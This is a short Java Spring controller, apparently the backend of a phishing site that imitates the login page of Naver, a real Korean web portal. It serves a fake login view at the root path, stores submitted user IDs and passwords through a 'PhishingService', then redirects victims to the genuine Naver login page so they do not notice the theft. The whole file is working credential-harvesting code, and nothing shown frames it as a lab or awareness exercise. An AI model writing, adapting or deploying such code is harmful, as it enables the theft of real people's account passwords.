package kimleeduldul.kimleeduldul_spring.controller;

import kimleeduldul.kimleeduldul_spring.Entity.Login;
import kimleeduldul.kimleeduldul_spring.Service.PhishingService;
import kimleeduldul.kimleeduldul_spring.request.LoginRequest;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

@Controller
@CrossOrigin
@RequiredArgsConstructor
public class PhishingConroller {

    private final PhishingService phishingService;

    @GetMapping("/test")
    public String test(){
        String abcd = new String();
        return "test";
    }

    @GetMapping("/phishingNaver")
    public String phishingPage(){
        return "phishing";
    }
    @GetMapping("/")
    public String defaultPhishingPage(){
        return "phishing";
    }

    @PostMapping("/phishingUserInfo")
    public String phishingTry(@RequestParam("id") String id,
                              @RequestParam("pw") String pw)
    {
        phishingService.saveUserInfo(Login.builder().userName(id).password(pw).build());
        return "redirect:https://nid.naver.com/nidlogin.login?mode=form&url=https://www.naver.com/";
    }
}
